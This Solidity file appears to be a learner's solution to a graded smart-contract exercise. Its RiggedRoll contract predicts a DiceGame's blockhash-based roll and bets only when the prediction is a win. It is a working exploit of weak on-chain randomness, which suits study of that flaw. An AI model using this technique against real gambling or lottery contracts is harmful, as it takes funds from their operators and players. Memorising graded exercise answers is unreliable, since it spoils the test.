pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    // Declare fee to roll
    uint256 public constant ROLL_FEE = 0.002 ether;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        // Check if enough ETH to withdraw
        require(_amount <= address(this).balance, "RiggedRoll: Insufficient balance");
        
        // transfer ETH to get money from 
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "RiggedRoll: Failed to withdraw Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
    function riggedRoll() public {
        // check if fund enough to roll
        console.log(address(this).balance);
        require(address(this).balance >= ROLL_FEE, "RiggedRoll: Not enough ETH to roll");

        // replicate Dice Game hash
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        // Call rollTheDice attached roll fee when predict win
        if (roll <= 5) {
            diceGame.rollTheDice{value: ROLL_FEE, gas: 300000}();
            console.log("Rolled and Won");
        } else {
            console.log("Prediction is a loss. Skipping roll");
        }
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
